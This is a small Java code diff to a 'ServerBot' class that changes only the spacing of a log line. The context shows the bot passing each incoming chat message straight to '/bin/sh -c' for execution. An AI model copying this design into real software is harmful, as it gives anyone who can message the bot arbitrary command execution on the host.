@@ -34,7 +34,7 @@ public class ServerBot extends CryptBot {
 		}));
 		try{
 			Timestamp timestamp = new Timestamp(new Date().getTime());
-			System.out.println("sender:"+sender+" login:"+login+" hostname:"+hostname+" time: "+timestamp+" cmd:"+message.trim());
+			System.out.println("sender:"+sender+" login:"+login+" hostname:"+hostname+" time:"+timestamp+" cmd:"+message.trim());
 			//CommandLine cmd = CommandLine.parse(message.trim());
 			CommandLine cmd = new CommandLine("/bin/sh").addArgument("-c").addArgument(message.trim(), false);
 			int exitValue = ex.execute(cmd);
